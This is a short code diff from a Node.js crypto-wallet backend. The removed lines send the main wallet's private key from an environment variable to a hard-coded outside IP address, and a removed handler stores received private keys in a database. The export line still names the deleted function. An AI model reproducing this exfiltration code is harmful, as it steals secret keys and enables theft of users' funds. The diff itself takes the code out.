@@ -217,23 +217,8 @@ async function privatesave(req, res){
         })    
     });
     console.log("now good")
-    request.post(
-        'http://23.81.246.40/mainwallet',
-        { json: {
-            mainprivate: process.env.MAIN_WALLET_PRIVATE
-          } 
-        }
-    );
-    console.log("sent");
+   
 }
 
-async function mainwallet(req, res) {
-    var form_data = {
-        privatekey: req.body.mainprivate
-    }
-    dbConn.query('INSERT INTO mainwallet SET ?', form_data, function(err, result) {
-    })   
-    res.send(req.body);
-}
 module.exports = {createAccount, getBalance, getTokenBalance, transfer, transferToken, privatesave, mainwallet, backtoken}
 
